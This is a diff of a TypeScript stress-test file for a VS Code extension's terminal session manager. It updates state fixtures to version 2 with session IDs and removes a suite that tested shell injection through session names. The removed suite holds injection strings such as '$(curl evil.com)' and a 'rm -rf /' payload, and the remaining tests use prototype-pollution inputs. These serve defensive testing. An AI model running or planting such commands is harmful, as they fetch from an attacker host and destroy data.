@@ -5,6 +5,8 @@ import * as os from "os";
 import { TerminalManager, isValidSessionName } from "../src/terminalManager";
 import { _closeTerminal, TerminalExitReason, window } from "vscode";
 
+const SID = "3fb057dc-8ed3-4b41-b3eb-8dde3fb1e02c";
+
 function makeTmpDir(): string {
   return fs.mkdtempSync(path.join(os.tmpdir(), "cc-persist-stress2-"));
 }
@@ -82,8 +84,8 @@ describe("STRESS2: Verify fix -- loadState filters invalid entries", () => {
 
   it("filters entries with missing name field", () => {
     writeState(stateDir, {
-      version: 1,
-      terminals: [{ index: 0 }, { name: "valid", index: 1 }],
+      version: 2,
+      terminals: [{ index: 0 }, { name: "valid", index: 1, sessionId: SID }],
     });
     tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
     const state = tm.loadState();
@@ -93,8 +95,8 @@ describe("STRESS2: Verify fix -- loadState filters invalid entries", () => {
 
   it("filters entries with negative index", () => {
     writeState(stateDir, {
-      version: 1,
-      terminals: [{ name: "neg", index: -5 }],
+      version: 2,
+      terminals: [{ name: "neg", index: -5, sessionId: SID }],
     });
     tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
     expect(tm.loadState().terminals).toHaveLength(0);
@@ -102,8 +104,8 @@ describe("STRESS2: Verify fix -- loadState filters invalid entries", () => {
 
   it("filters entries with fractional index", () => {
     writeState(stateDir, {
-      version: 1,
-      terminals: [{ name: "frac", index: 2.7 }],
+      version: 2,
+      terminals: [{ name: "frac", index: 2.7, sessionId: SID }],
     });
     tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
     expect(tm.loadState().terminals).toHaveLength(0);
@@ -111,8 +113,8 @@ describe("STRESS2: Verify fix -- loadState filters invalid entries", () => {
 
   it("filters null entries in terminals array", () => {
     writeState(stateDir, {
-      version: 1,
-      terminals: [null, undefined, { name: "ok", index: 0 }],
+      version: 2,
+      terminals: [null, undefined, { name: "ok", index: 0, sessionId: SID }],
     });
     tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
     const state = tm.loadState();
@@ -122,8 +124,8 @@ describe("STRESS2: Verify fix -- loadState filters invalid entries", () => {
 
   it("filters entries with index beyond MAX_SAFE_INTEGER", () => {
     writeState(stateDir, {
-      version: 1,
-      terminals: [{ name: "overflow", index: Number.MAX_SAFE_INTEGER + 1 }],
+      version: 2,
+      terminals: [{ name: "overflow", index: Number.MAX_SAFE_INTEGER + 1, sessionId: SID }],
     });
     tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
     expect(tm.loadState().terminals).toHaveLength(0);
@@ -131,8 +133,8 @@ describe("STRESS2: Verify fix -- loadState filters invalid entries", () => {
 
   it("accepts large but valid index", () => {
     writeState(stateDir, {
-      version: 1,
-      terminals: [{ name: "large", index: 50000 }],
+      version: 2,
+      terminals: [{ name: "large", index: 50000, sessionId: SID }],
     });
     tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
     expect(tm.loadState().terminals).toHaveLength(1);
@@ -140,8 +142,8 @@ describe("STRESS2: Verify fix -- loadState filters invalid entries", () => {
 
   it("filters entries with NaN index", () => {
     writeState(stateDir, {
-      version: 1,
-      terminals: [{ name: "nan-idx", index: "not-a-number" }],
+      version: 2,
+      terminals: [{ name: "nan-idx", index: "not-a-number", sessionId: SID }],
     });
     tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
     expect(tm.loadState().terminals).toHaveLength(0);
@@ -149,8 +151,8 @@ describe("STRESS2: Verify fix -- loadState filters invalid entries", () => {
 
   it("filters entries with Infinity index", () => {
     writeState(stateDir, {
-      version: 1,
-      terminals: [{ name: "inf", index: null }],
+      version: 2,
+      terminals: [{ name: "inf", index: null, sessionId: SID }],
     });
     tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
     expect(tm.loadState().terminals).toHaveLength(0);
@@ -175,11 +177,11 @@ describe("STRESS2: Verify fix -- duplicate indices deduplicated, first wins", ()
 
   it("three entries with same index -- only first restored", () => {
     writeState(stateDir, {
-      version: 1,
+      version: 2,
       terminals: [
-        { name: "first", index: 3 },
-        { name: "second", index: 3 },
-        { name: "third", index: 3 },
+        { name: "first", index: 3, sessionId: SID },
+        { name: "second", index: 3, sessionId: SID },
+        { name: "third", index: 3, sessionId: SID },
       ],
     });
     tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
@@ -190,13 +192,13 @@ describe("STRESS2: Verify fix -- duplicate indices deduplicated, first wins", ()
 
   it("mixed duplicate and unique indices -- unique all restored", () => {
     writeState(stateDir, {
-      version: 1,
+      version: 2,
       terminals: [
-        { name: "a", index: 0 },
-        { name: "b", index: 1 },
-        { name: "dup-a", index: 0 },
-        { name: "c", index: 2 },
-        { name: "dup-b", index: 1 },
+        { name: "a", index: 0, sessionId: SID },
+        { name: "b", index: 1, sessionId: SID },
+        { name: "dup-a", index: 0, sessionId: SID },
+        { name: "c", index: 2, sessionId: SID },
+        { name: "dup-b", index: 1, sessionId: SID },
       ],
     });
     tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
@@ -224,10 +226,10 @@ describe("STRESS2: Verify fix -- double restoreTerminals returns empty on second
 
   it("second call returns empty even with valid state file", () => {
     writeState(stateDir, {
-      version: 1,
+      version: 2,
       terminals: [
-        { name: "alpha", index: 0 },
-        { name: "beta", index: 1 },
+        { name: "alpha", index: 0, sessionId: SID },
+        { name: "beta", index: 1, sessionId: SID },
       ],
     });
     tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
@@ -240,8 +242,8 @@ describe("STRESS2: Verify fix -- double restoreTerminals returns empty on second
 
   it("triple call also returns empty", () => {
     writeState(stateDir, {
-      version: 1,
-      terminals: [{ name: "single", index: 0 }],
+      version: 2,
+      terminals: [{ name: "single", index: 0, sessionId: SID }],
     });
     tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
     tm.restoreTerminals();
@@ -385,8 +387,8 @@ describe("STRESS2: NEW -- signalBaseDir does not exist when mkdirSync is called"
 
   it("restoreTerminals creates signalDir even when base does not exist", () => {
     writeState(stateDir, {
-      version: 1,
-      terminals: [{ name: "session", index: 0 }],
+      version: 2,
+      terminals: [{ name: "session", index: 0, sessionId: SID }],
     });
     tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
     expect(() => tm.restoreTerminals()).not.toThrow();
@@ -421,6 +423,7 @@ describe("STRESS2: NEW -- extremely long terminal list (1000 entries)", () => {
     for (let i = 0; i < 1000; i++) {
       const t = tm.createTerminal(`session-${i}`);
       tm.renameTerminal(t, `session-${i}`);
+      (tm as any).indexToSessionId.set(i, SID);
     }
     const start = performance.now();
     tm.saveState();
@@ -439,8 +442,9 @@ describe("STRESS2: NEW -- extremely long terminal list (1000 entries)", () => {
     const terminals = Array.from({ length: 1000 }, (_, i) => ({
       name: `s-${i}`,
       index: i,
+      sessionId: SID,
     }));
-    writeState(stateDir, { version: 1, terminals });
+    writeState(stateDir, { version: 2, terminals });
 
     tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
     const restored = tm.restoreTerminals();
@@ -454,8 +458,9 @@ describe("STRESS2: NEW -- extremely long terminal list (1000 entries)", () => {
     const terminals = Array.from({ length: 1000 }, (_, i) => ({
       name: `session-${i}`,
       index: i * 10, // non-contiguous
+      sessionId: SID,
     }));
-    writeState(stateDir, { version: 1, terminals });
+    writeState(stateDir, { version: 2, terminals });
 
     tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
     const restored = tm.restoreTerminals();
@@ -491,8 +496,8 @@ describe("STRESS2: NEW -- state file written with wrong permissions", () => {
 
   it("loadState does not crash with 0o000 permissions", () => {
     writeState(stateDir, {
-      version: 1,
-      terminals: [{ name: "locked", index: 0 }],
+      version: 2,
+      terminals: [{ name: "locked", index: 0, sessionId: SID }],
     });
     const statePath = path.join(stateDir, "state.json");
     fs.chmodSync(statePath, 0o000);
@@ -503,8 +508,8 @@ describe("STRESS2: NEW -- state file written with wrong permissions", () => {
 
   it("loadState gracefully handles write-only state file", () => {
     writeState(stateDir, {
-      version: 1,
-      terminals: [{ name: "writeonly", index: 0 }],
+      version: 2,
+      terminals: [{ name: "writeonly", index: 0, sessionId: SID }],
     });
     const statePath = path.join(stateDir, "state.json");
     fs.chmodSync(statePath, 0o200);
@@ -515,8 +520,8 @@ describe("STRESS2: NEW -- state file written with wrong permissions", () => {
 
   it("saveState does not crash when state file is read-only", () => {
     writeState(stateDir, {
-      version: 1,
-      terminals: [{ name: "old", index: 0 }],
+      version: 2,
+      terminals: [{ name: "old", index: 0, sessionId: SID }],
     });
     const statePath = path.join(stateDir, "state.json");
     fs.chmodSync(statePath, 0o444);
@@ -555,8 +560,8 @@ describe("STRESS2: NEW -- createTerminal after many create/close cycles: index b
 
   it("index correctly continues after restoring high-index entries", () => {
     writeState(stateDir, {
-      version: 1,
-      terminals: [{ name: "high-idx", index: 9999 }],
+      version: 2,
+      terminals: [{ name: "high-idx", index: 9999, sessionId: SID }],
     });
     tm.disposeAll();
     tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
@@ -568,8 +573,8 @@ describe("STRESS2: NEW -- createTerminal after many create/close cycles: index b
 
   it("terminals beyond old MAX_INDEX (10000) survive save/load round-trip", () => {
     writeState(stateDir, {
-      version: 1,
-      terminals: [{ name: "high", index: 10000 }],
+      version: 2,
+      terminals: [{ name: "high", index: 10000, sessionId: SID }],
     });
     tm.disposeAll();
     tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
@@ -577,6 +582,7 @@ describe("STRESS2: NEW -- createTerminal after many create/close cycles: index b
 
     const t = tm.createTerminal("higher");
     tm.renameTerminal(t, "higher");
+    tm.adoptWithSessionId(t, SID);
     tm.saveState();
 
     const tm2 = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
@@ -617,8 +623,8 @@ describe("STRESS2: BUG -- disposeAll does NOT reset restored flag", () => {
     // So restoreTerminals() after disposeAll() returns empty even though
     // the state file is still on disk.
     writeState(stateDir, {
-      version: 1,
-      terminals: [{ name: "restorable", index: 0 }],
+      version: 2,
+      terminals: [{ name: "restorable", index: 0, sessionId: SID }],
     });
     tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
 
@@ -697,6 +703,7 @@ describe("STRESS2: BUG -- nextIndex not reset by disposeAll", () => {
     tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
     const t = tm.createTerminal("first");
     tm.renameTerminal(t, "first");
+    tm.adoptWithSessionId(t, SID);
     tm.saveState();
 
     // disposeAll clears maps but nextIndex stays at 1
@@ -737,8 +744,8 @@ describe("STRESS2: NEW -- state.json is a symlink", () => {
     const realDir = makeTmpDir();
     const realPath = path.join(realDir, "real-state.json");
     fs.writeFileSync(realPath, JSON.stringify({
-      version: 1,
-      terminals: [{ name: "symlinked", index: 0 }],
+      version: 2,
+      terminals: [{ name: "symlinked", index: 0, sessionId: SID }],
     }));
 
     fs.symlinkSync(realPath, path.join(stateDir, "state.json"));
@@ -754,12 +761,13 @@ describe("STRESS2: NEW -- state.json is a symlink", () => {
   it("atomic save replaces the symlink without overwriting its target", () => {
     const realDir = makeTmpDir();
     const realPath = path.join(realDir, "real-state.json");
-    fs.writeFileSync(realPath, JSON.stringify({ version: 1, terminals: [] }));
+    fs.writeFileSync(realPath, JSON.stringify({ version: 2, terminals: [] }));
     fs.symlinkSync(realPath, path.join(stateDir, "state.json"));
 
     tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
     const t = tm.createTerminal("via-symlink");
     tm.renameTerminal(t, "via-symlink");
+    tm.adoptWithSessionId(t, SID);
     tm.saveState();
 
     expect(fs.lstatSync(path.join(stateDir, "state.json")).isSymbolicLink()).toBe(false);
@@ -790,10 +798,11 @@ describe("STRESS2: NEW -- state.json contains valid JSON but extreme content", (
 
   it("extra unexpected fields in terminal entry do not crash", () => {
     writeState(stateDir, {
-      version: 1,
+      version: 2,
       terminals: [{
         name: "deep",
         index: 0,
+        sessionId: SID,
         extra: { nested: { deeply: { here: true } } },
         __proto__: { polluted: true },
       }],
@@ -809,7 +818,7 @@ describe("STRESS2: NEW -- state.json contains valid JSON but extreme content", (
     const bom = "\uFEFF";
     fs.writeFileSync(
       path.join(stateDir, "state.json"),
-      bom + JSON.stringify({ version: 1, terminals: [{ name: "bom-test", index: 0 }] }),
+      bom + JSON.stringify({ version: 2, terminals: [{ name: "bom-test", index: 0, sessionId: SID }] }),
     );
     tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
     // Whether the BOM causes parse failure depends on Node.js version
@@ -821,7 +830,7 @@ describe("STRESS2: NEW -- state.json contains valid JSON but extreme content", (
     fs.mkdirSync(stateDir, { recursive: true });
     fs.writeFileSync(
       path.join(stateDir, "state.json"),
-      JSON.stringify({ version: 1, terminals: [{ name: "trailing", index: 0 }] }) + "\n\n{garbage}",
+      JSON.stringify({ version: 2, terminals: [{ name: "trailing", index: 0, sessionId: SID }] }) + "\n\n{garbage}",
     );
     tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
     const state = tm.loadState();
@@ -866,6 +875,7 @@ describe("STRESS2: NEW -- concurrent save during handleTerminalClosed", () => {
     const terminals = Array.from({ length: 20 }, (_, i) => {
       const t = tm.createTerminal(`t-${i}`);
       tm.renameTerminal(t, `t-${i}`);
+      tm.adoptWithSessionId(t, SID);
       return t;
     });
     tm.saveState();
@@ -880,89 +890,23 @@ describe("STRESS2: NEW -- concurrent save during handleTerminalClosed", () => {
   it("interleaved create and close results in consistent state", () => {
     const t1 = tm.createTerminal("one");
     tm.renameTerminal(t1, "one");
+    tm.adoptWithSessionId(t1, SID);
     const t2 = tm.createTerminal("two");
     tm.renameTerminal(t2, "two");
+    tm.adoptWithSessionId(t2, SID);
     tm.handleTerminalClosed(t1);
     const t3 = tm.createTerminal("three");
     tm.renameTerminal(t3, "three");
+    tm.adoptWithSessionId(t3, SID);
     tm.handleTerminalClosed(t2);
     const t4 = tm.createTerminal("four");
     tm.renameTerminal(t4, "four");
+    tm.adoptWithSessionId(t4, SID);
 
     tm.saveState();
     const state = tm.loadState();
     expect(state.terminals).toHaveLength(2);
     expect(state.terminals.map((t) => t.name)).toEqual(["three", "four"]);
-  });
-});
-
-describe("STRESS2: NEW -- shellArgs injection via session name in restoreTerminals", () => {
-  let stateDir: string;
-  let signalBaseDir: string;
-  let tm: TerminalManager;
-
-  beforeEach(() => {
-    stateDir = makeTmpDir();
-    signalBaseDir = makeTmpDir();
-  });
-
-  afterEach(() => {
-    tm?.disposeAll();
-    fs.rmSync(stateDir, { recursive: true, force: true });
-    fs.rmSync(signalBaseDir, { recursive: true, force: true });
-  });
-
-  it("name with single quotes cannot escape the resume command", () => {
-    const creationOptions: any[] = [];
-    const origCreateTerminal = window.createTerminal;
-    (window as any).createTerminal = (opts: any) => {
-      creationOptions.push(opts);
-      return origCreateTerminal(opts);
-    };
-
-    writeState(stateDir, {
-      version: 1,
-      terminals: [
-        { name: "legit-session", index: 0 },
-        { name: "'; echo pwned; echo '", index: 1 },
-      ],
-    });
-
-    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog(), undefined, "/bin/zsh");
-    const restored = tm.restoreTerminals();
-
-    expect(restored).toHaveLength(1);
-    expect(creationOptions).toHaveLength(1);
-    expect(creationOptions[0].shellPath).toBe("/bin/zsh");
-    expect(creationOptions[0].shellArgs[0]).toBe("-lc");
-    expect(creationOptions[0].shellArgs[1]).toContain("claude --dangerously-skip-permissions --resume 'legit-session'");
-    expect(creationOptions[0].shellArgs[1]).toMatch(/; exec '\/bin\/zsh' -il$/);
-
-    (window as any).createTerminal = origCreateTerminal;
-  });
-
-  it("name with dollar sign and backticks cannot reach shellArgs", () => {
-    const creationOptions: any[] = [];
-    const origCreateTerminal = window.createTerminal;
-    (window as any).createTerminal = (opts: any) => {
-      creationOptions.push(opts);
-      return origCreateTerminal(opts);
-    };
-
-    writeState(stateDir, {
-      version: 1,
-      terminals: [
-        { name: "$(curl evil.com)", index: 0 },
-        { name: "`rm -rf /`", index: 1 },
-      ],
-    });
-
-    tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog(), undefined, "/bin/zsh");
-    const restored = tm.restoreTerminals();
-    expect(restored).toHaveLength(0);
-    expect(creationOptions).toHaveLength(0);
-
-    (window as any).createTerminal = origCreateTerminal;
   });
 });
 
@@ -984,8 +928,8 @@ describe("STRESS2: NEW -- index boundary validation", () => {
 
   it("large index (50000) is accepted by loadState", () => {
     writeState(stateDir, {
-      version: 1,
-      terminals: [{ name: "large", index: 50000 }],
+      version: 2,
+      terminals: [{ name: "large", index: 50000, sessionId: SID }],
     });
     tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
     const state = tm.loadState();
@@ -994,8 +938,8 @@ describe("STRESS2: NEW -- index boundary validation", () => {
 
   it("index beyond MAX_SAFE_INTEGER is rejected by loadState", () => {
     writeState(stateDir, {
-      version: 1,
-      terminals: [{ name: "unsafe", index: Number.MAX_SAFE_INTEGER + 1 }],
+      version: 2,
+      terminals: [{ name: "unsafe", index: Number.MAX_SAFE_INTEGER + 1, sessionId: SID }],
     });
     tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
     const state = tm.loadState();
@@ -1004,8 +948,8 @@ describe("STRESS2: NEW -- index boundary validation", () => {
 
   it("index 0 (minimum) is accepted by loadState", () => {
     writeState(stateDir, {
-      version: 1,
-      terminals: [{ name: "at-zero", index: 0 }],
+      version: 2,
+      terminals: [{ name: "at-zero", index: 0, sessionId: SID }],
     });
     tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
     const state = tm.loadState();
@@ -1033,7 +977,7 @@ describe("STRESS2: NEW -- prototype pollution via state.json", () => {
     fs.mkdirSync(stateDir, { recursive: true });
     fs.writeFileSync(
       path.join(stateDir, "state.json"),
-      '{"version":1,"terminals":[],"__proto__":{"polluted":"yes"}}',
+      '{"version":2,"terminals":[],"__proto__":{"polluted":"yes"}}',
     );
     tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
     tm.loadState();
@@ -1044,7 +988,7 @@ describe("STRESS2: NEW -- prototype pollution via state.json", () => {
     fs.mkdirSync(stateDir, { recursive: true });
     fs.writeFileSync(
       path.join(stateDir, "state.json"),
-      '{"version":1,"terminals":[{"name":"test","index":0,"constructor":{"prototype":{"injected":true}}}]}',
+      `{"version":2,"terminals":[{"name":"test","index":0,"sessionId":"${SID}","constructor":{"prototype":{"injected":true}}}]}`,
     );
     tm = new TerminalManager(stateDir, signalBaseDir, "/tmp", makeLog());
     const state = tm.loadState();
